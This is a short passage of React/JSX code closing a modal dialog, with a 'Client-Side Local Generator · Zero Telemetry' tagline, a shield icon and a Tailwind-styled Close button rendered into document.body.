            <Shield className="w-3.5 h-3.5 text-emerald-500" />
            <span>Client-Side Local Generator · Zero Telemetry · 1-Click Copy</span>
          </div>

          <button
            onClick={onClose}
            className="px-4 py-1.5 rounded-lg bg-slate-200 dark:bg-cyber-card hover:bg-slate-300 dark:hover:bg-cyber-border text-slate-800 dark:text-white font-bold transition-colors text-xs"
          >
            Close
          </button>
        </div>
      </motion.div>
    </div>,
    document.body
  );
};
